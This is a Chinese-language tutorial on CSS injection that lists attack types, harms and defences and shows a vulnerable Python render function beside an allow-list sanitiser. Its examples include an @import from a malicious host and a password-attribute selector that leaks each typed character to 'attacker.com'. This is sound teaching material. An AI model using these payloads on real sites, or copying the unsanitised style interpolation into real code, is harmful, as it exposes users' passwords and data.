# CSS注入（CSS Injection）详解

## 一、什么是CSS注入？
CSS注入是一种安全漏洞，攻击者通过将恶意CSS代码注入到网页中，从而控制页面样式或执行其他恶意操作。CSS注入通常发生在网站没有正确过滤用户输入的情况下，使得攻击者可以注入自定义CSS代码并被浏览器执行。

## 二、CSS注入的主要类型

### 1. 基本CSS注入
通过在输入框或URL参数中直接插入CSS代码，例如：
```css
<style>body{display:none;}</style>
```
这种攻击会修改页面样式，可能导致页面无法正常显示。

### 2. CSS选择器注入
攻击者通过注入恶意CSS选择器来选择特定元素并修改其样式，例如：
```css
#sensitive-data{background-color:red !important;}
```
这种攻击可以突出显示敏感数据，方便攻击者获取。

### 3. CSS表达式注入
在旧版IE浏览器中，支持使用JavaScript表达式作为CSS值，例如：
```css
div{background-image:expression(alert('XSS'));}
```
虽然现代浏览器已不再支持，但在某些特定环境下仍需注意。

### 4. CSS函数注入
通过注入恶意CSS函数来执行攻击，例如：
```css
@import url('https://malicious-site.com/evil.css');
```
这种攻击可以引入外部恶意CSS文件。

### 5. 数据窃取型CSS注入
利用CSS的特性来窃取用户数据，例如：
```css
input[type=password][value^="a"]{background-image:url("https://attacker.com/log?char=a");}
```
这种攻击可以通过背景图片请求来窃取密码的每个字符。

## 三、CSS注入的危害

1. **页面样式篡改**：修改网页外观，影响用户体验
2. **敏感信息泄露**：窃取用户输入的敏感数据（如密码、信用卡信息）
3. **会话劫持**：配合其他漏洞进行会话劫持
4. **钓鱼攻击**：伪装成合法页面诱骗用户输入敏感信息
5. **拒绝服务攻击**：通过复杂CSS消耗浏览器资源

## 四、CSS注入的防护措施

1. **输入验证和过滤**：对所有用户输入进行严格验证和过滤，特别是CSS相关的输入
2. **内容安全策略（CSP）**：使用CSP限制外部资源的加载
3. **转义特殊字符**：对CSS中的特殊字符进行转义，如`<`、`>`、`"`等
4. **使用安全的CSS属性**：避免使用可能执行代码的CSS属性
5. **定期安全审计**：定期检查网站代码中的安全漏洞

## 五、示例与代码防护

### 1. 易受攻击的代码
```python
# 易受攻击的代码
def render_page(user_input):
    return f"<div style='{user_input}'>内容</div>"
```

### 2. 安全的代码
```python
# 安全的代码
import re

def sanitize_css(input_css):
    # 只允许特定的CSS属性
    allowed_properties = ['color', 'font-size', 'background-color']
    sanitized = []
    
    # 分割CSS属性
    properties = input_css.split(';')
    for prop in properties:
        if ':' in prop:
            key, value = prop.split(':', 1)
            key = key.strip().lower()
            value = value.strip()
            
            # 检查是否为允许的属性
            if key in allowed_properties:
                # 验证值的安全性
                if re.match(r'^[a-zA-Z0-9#\s.-]+$', value):
                    sanitized.append(f"{key}:{value}")
    
    return ';'.join(sanitized)

def render_page(user_input):
    safe_css = sanitize_css(user_input)
    return f"<div style='{safe_css}'>内容</div>"
```

## 六、总结
CSS注入虽然不如XSS攻击那么常见，但仍然是一种需要重视的安全漏洞。通过采取适当的防护措施，可以有效防止CSS注入攻击，保护网站和用户的安全。